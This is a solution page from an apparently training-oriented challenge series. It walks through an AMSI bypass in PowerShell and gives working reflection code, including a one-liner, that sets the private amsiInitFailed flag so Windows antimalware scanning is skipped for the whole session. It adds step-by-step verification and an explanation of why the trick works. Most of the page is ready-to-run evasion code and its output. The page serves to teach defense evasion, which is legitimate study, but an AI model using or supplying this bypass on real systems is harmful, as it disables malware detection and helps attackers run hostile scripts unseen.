---
title: "Solution 31: AMSI Init Failed Flag"
challenge_number: 31
difficulty: medium
category: "AMSI Bypass"
permalink: /solutions/31-amsi-init-failed/
---

# Solution: AMSI Init Failed Flag

[Back to Challenge](../challenges/31-amsi-init-failed.md)

## Overview

Use .NET Reflection to access the private static field `amsiInitFailed` inside `System.Management.Automation.AmsiUtils` and set it to `True`. This makes PowerShell believe AMSI never initialized successfully, causing it to skip all scan calls.

## Working Code

```powershell
# Access the internal AmsiUtils class via Reflection
$ref = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')

# Get the private static boolean field 'amsiInitFailed'
$field = $ref.GetField('amsiInitFailed','NonPublic,Static')

# Set it to True - PowerShell now thinks AMSI never loaded
$field.SetValue($null, $true)
```

### Verification That It Worked

```powershell
# After setting the flag, test with a known-bad string
Invoke-Expression 'Write-Host "AMSI bypass successful - malware test string"'
# If AMSI were active, this would be blocked. Now it executes freely.
```

### One-Liner Version

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

## Why It Works

Inside `System.Management.Automation.dll`, the `AmsiUtils` class contains the AMSI integration logic. Before every script block is executed, PowerShell checks a private static boolean:

```csharp
// Simplified internal logic (decompiled)
internal class AmsiUtils
{
    private static bool amsiInitFailed = false;

    internal static AmsiNativeMethods.AMSI_RESULT ScanContent(string content, string sourceMetadata)
    {
        if (amsiInitFailed)
            return AmsiNativeMethods.AMSI_RESULT.AMSI_RESULT_NOT_DETECTED;
        // ... actual scan logic ...
    }
}
```

When `amsiInitFailed` is `true`:
1. `ScanContent()` returns `AMSI_RESULT_NOT_DETECTED` immediately
2. No call to `AmsiScanBuffer()` is ever made
3. No content is sent to the antimalware provider
4. All subsequent commands in the session execute without scanning

The field is `private static`, meaning it's inaccessible through normal code. However, .NET Reflection ignores access modifiers entirely — `BindingFlags.NonPublic` explicitly requests private members. Since PowerShell runs in the same AppDomain as the `AmsiUtils` class, reflection has full access.

### Why `[Ref].Assembly`?

`[Ref].Assembly` is a shortcut to get `System.Management.Automation.dll` — the assembly that contains `AmsiUtils`. You could also use:

```powershell
[PSObject].Assembly.GetType('System.Management.Automation.AmsiUtils')
```

Any type from that assembly works as an entry point.

## How to Verify

1. Open a fresh PowerShell session (AMSI is active by default):
   ```powershell
   powershell.exe -NoProfile
   ```

2. Confirm AMSI is currently active by checking the field:
   ```powershell
   $ref = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
   $field = $ref.GetField('amsiInitFailed','NonPublic,Static')
   Write-Host "Before: amsiInitFailed = $($field.GetValue($null))"
   # Output: Before: amsiInitFailed = False
   ```

3. Apply the bypass:
   ```powershell
   $field.SetValue($null, $true)
   ```

4. Confirm the field is now True:
   ```powershell
   Write-Host "After: amsiInitFailed = $($field.GetValue($null))"
   # Output: After: amsiInitFailed = True
   ```

5. Test with a string that would normally trigger AMSI:
   ```powershell
   # This keyword combination is flagged by most AMSI providers
   Invoke-Expression 'Write-Host "amsiutils test - malware loaded successfully"'
   ```
   If it executes without error, AMSI has been bypassed.

6. Compare with a session where the flag is NOT set — the same `Invoke-Expression` would produce an error like:
   ```
   This script contains malicious content and has been blocked by your antivirus software.
   ```
